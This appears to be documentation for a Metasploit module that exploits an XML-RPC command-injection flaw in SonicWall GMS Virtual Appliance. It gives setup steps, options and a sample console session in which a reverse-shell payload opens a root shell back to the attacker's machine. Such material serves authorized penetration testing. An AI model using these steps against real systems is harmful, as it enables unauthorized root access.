## Vulnerable Application

sonicwall_xmlrpc_rce is a remote exploit against SonicWall Global Management
System Virtual Appliance and is written by Michael Flanders of Trend
Micro Zero Day Initiative with assistance by @kernelsmith of Trend Micro Zero
Day Initiative. It is considered a reliable exploit, and allows you to remotely
execute commands as root.

* This exploit works against a vulnerable SonicWall Global Management System
Virtual Appliance (A.K.A. Sonicwall GMSVP) of versions 8.1 (Build 8110.1197) and
earlier. The virtual appliance can be downloaded here:
  * http://www.sonicwall.com/products/sonicwall-gms/

* This module exploits the virtual appliance's lack of checking on user-supplied
parameters to XML-RPC calls to a vulnerable Java service running on port 21009.
A call to a shell script is made using this user-supplied parameter contained in
backticks allowing command substitution and remote code execution.

* To reliably determine whether the target virtual appliance is vulnerable,
you will have to examine the web console's login page. This is also automatically
done in the check function of the exploit.

## Verification Steps

- [x] Start `msfconsole`
- [x] `use exploit/unix/sonicwall/sonicwall_xmlrpc_rce`
- [x] `set RHOST` to the IP address of the vulnerable virtual appliance
- [x] `set RPORT` to 21009
- [x] `set payload` to the desired payload
- [x] set any additional options for the payload e.g. LHOST/LPORT
- [x] `exploit`
- [x] **Verify** that you get a shell
- [x] **Verify** that you do not crash

## Options

```
set SSL [true/false]
```

* Set this true/false depending on whether the instance of SonicWall GMSVP has
been configured to use SSL.


```
set WEB_SERVER_PORT [port]
```

* This is the port of the login page for the web server/virtual appliance. For
SonicWall GMVSP this is typically http://[ip]:80; therefore, this option is set
by default to 80 (or 443 if `set SSL true`).

## Scenarios

* This is example output from a normal usage/scenario. This console output is for
SonicWall GMSVP version 8.0 (Build 8046.1396):

```
msf > use exploit/unix/sonicwall/sonicwall_xmlrpc_rce
msf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) > show options

Module options (exploit/unix/sonicwall/sonicwall_xmlrpc_rce):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                             yes       The target address
   RPORT            80               yes       The target port (TCP)
   SSL              false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                             no        HTTP server virtual host
   WEB_SERVER_PORT                   no        Port of web console login page.
                                             Defaults to 80/443 depending on SSL.


Exploit target:

   Id  Name
   --  ----
   0   SonicWall Global Management System Virtual Appliance


msf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) > set RPORT 21009
RPORT => 21009

msf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) > set RHOST 192.168.152.173
RHOST => 192.168.152.173

msf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) > set payload cmd/unix/reverse
payload => cmd/unix/reverse

msf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) > set LHOST 192.168.152.193
LHOST => 192.168.152.193

msf exploit(unix/sonicwall/sonicwall_xmlrpc_rce) > exploit

[*] Started reverse TCP double handler on 192.168.152.193:4444
[*] The target appears to be vulnerable, continuing exploit...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo H7sn3KYXeuCZy27Q;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "H7sn3KYXeuCZy27Q\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.152.193:4444 -> 192.168.152.173:44698) at 2018-07-05 12:30:56 -0400
```

